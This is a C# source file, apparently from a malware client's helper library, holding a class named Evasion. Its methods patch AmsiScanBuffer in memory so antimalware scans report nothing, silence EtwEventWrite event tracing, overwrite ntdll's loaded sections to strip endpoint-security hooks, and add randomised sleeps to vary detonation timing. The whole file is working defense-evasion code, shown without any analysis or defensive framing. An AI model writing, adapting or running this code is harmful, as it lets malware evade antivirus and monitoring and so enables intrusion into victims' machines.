using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Client.Helper
{
    public static class Evasion
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                                  uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        // E_INVALIDARG — makes every AmsiScanBuffer return "no detection"
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public static void PatchAmsi()
        {
            try
            {
                IntPtr amsi = LoadLibrary("amsi.dll");          // must be loaded before GetProcAddress
                if (amsi == IntPtr.Zero) return;

                IntPtr scan = GetProcAddress(amsi, "AmsiScanBuffer");
                if (scan == IntPtr.Zero) return;

                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057 ; ret
                uint old;
                if (!VirtualProtect(scan, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out old)) return;
                Marshal.Copy(patch, 0, scan, patch.Length);
                VirtualProtect(scan, (UIntPtr)patch.Length, old, out old);
            }
            catch { }
        }

        // EtwEventWrite -> xor eax,eax ; ret  (returns STATUS_SUCCESS, emits nothing)
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public static void PatchEtw()
        {
            try
            {
                IntPtr ntdll = GetModuleHandle("ntdll.dll");
                IntPtr etw = GetProcAddress(ntdll, "EtwEventWrite");
                if (etw == IntPtr.Zero) return;

                byte[] patch = { 0x33, 0xC0, 0xC3 };
                uint old;
                if (!VirtualProtect(etw, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out old)) return;
                Marshal.Copy(patch, 0, etw, patch.Length);
                VirtualProtect(etw, (UIntPtr)patch.Length, old, out old);
            }
            catch { }
        }

        // Overwrite ntdll's mapped sections with clean bytes from disk
        [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
        public static void UnhookNtdll()
        {
            try
            {
                byte[] fresh = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
                IntPtr baseAddr = GetModuleHandle("ntdll.dll");
                if (baseAddr == IntPtr.Zero) return;

                int peOff = BitConverter.ToInt32(fresh, 0x3C);
                int numSec = BitConverter.ToInt16(fresh, peOff + 0x06);
                int optSize = BitConverter.ToInt16(fresh, peOff + 0x14);
                int secTable = peOff + 0x18 + optSize;

                for (int i = 0; i < numSec; i++)
                {
                    int s = secTable + (i * 40);
                    int virtSize = BitConverter.ToInt32(fresh, s + 0x08);
                    int virtAddr = BitConverter.ToInt32(fresh, s + 0x0C);
                    int rawSize = BitConverter.ToInt32(fresh, s + 0x10);
                    int rawPtr = BitConverter.ToInt32(fresh, s + 0x14);
                    if (rawSize == 0) continue;

                    int len = Math.Min(Math.Min(virtSize, rawSize), fresh.Length - rawPtr);
                    IntPtr dst = (IntPtr)(baseAddr.ToInt64() + virtAddr);

                    uint old;
                    if (!VirtualProtect(dst, (UIntPtr)len, PAGE_EXECUTE_READWRITE, out old)) continue;
                    Marshal.Copy(fresh, rawPtr, dst, len);
                    VirtualProtect(dst, (UIntPtr)len, old, out old);
                }
            }
            catch { }
        }

        // Randomised "decoy" delay so every detonation window differs
        public static void SleepJitter(int minMs, int maxMs)
        {
            try { Thread.Sleep(new Random(Environment.TickCount).Next(minMs, maxMs)); } catch { }
        }
    }
}
